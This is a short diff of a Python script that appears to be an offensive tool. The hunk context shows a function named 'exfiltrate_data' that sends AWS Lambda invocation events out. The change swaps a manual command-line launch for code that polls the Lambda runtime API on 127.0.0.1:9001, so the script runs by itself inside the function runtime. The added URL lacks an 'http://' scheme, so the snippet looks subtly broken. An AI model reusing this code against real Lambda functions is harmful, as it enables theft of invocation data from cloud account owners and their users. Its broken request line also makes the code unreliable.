@@ -525,11 +525,8 @@ def exfiltrate_data(event, invoke_id):
     except Exception as err:
         print(f"[!] Failed to send event {invoke_id} : {repr(err)}")
 
-
-if __name__ == '__main__':
-    if len(sys.argv) != 2:
-        print("[!] Lack of invoke-id! Usage: <bootstrap> <invoke-id>")
-        sys.exit(1)
-
-    invoke_id = sys.argv[1]
-    main(invoke_id)
+import urllib3
+http = urllib3.PoolManager()
+resp = http.request("GET", "127.0.0.1:9001/2018-06-01/runtime/invocation/next")
+invoke_id = resp.headers["Lambda-Runtime-Aws-Request-Id"]
+main(invoke_id)
